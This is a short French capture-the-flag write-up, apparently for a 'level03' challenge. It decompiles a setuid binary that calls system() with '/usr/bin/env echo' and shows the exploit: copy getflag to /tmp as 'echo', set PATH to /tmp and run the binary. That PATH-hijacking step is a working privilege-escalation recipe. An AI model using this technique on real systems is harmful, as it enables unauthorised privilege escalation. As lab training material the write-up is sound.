On trouve un binaire level03:
on le copie en local et on peut le decompiler avec gdb (disassemble) ou un logiciel qui restitue le programme en c:
    https://dogbolt.org/
on obtient:

int main(int argc,char **argv,char **envp)
{
  __gid_t __rgid;
  __uid_t __ruid;
  int iVar1;
  gid_t gid;
  uid_t uid;
  
  __rgid = getegid(); //recupere le groupe id du process
  __ruid = geteuid(); //recupeer le userid du process
  setresgid(__rgid,__rgid,__rgid); //change le groupe id
  setresuid(__ruid,__ruid,__ruid); //change le user id
  iVar1 = system("/usr/bin/env echo Exploit me"); // call un fonction system echo 
  return iVar1;
}

system vas chercher dans le PATH les endroit ou le binaire echo peut etre.
il faut donc que getflag soit executer dans le call system pour ca:

on peut copier getflag dans tmp et le renomer en echo:
    cp /usr/bin/getflag /tmp
    mv /tmp/getflag /tmp/echo

puis on modifie le path pour qu'il cherche le binaire dans /tmp:
    export PATH=/tmp
    
et on excute le programme:
    level03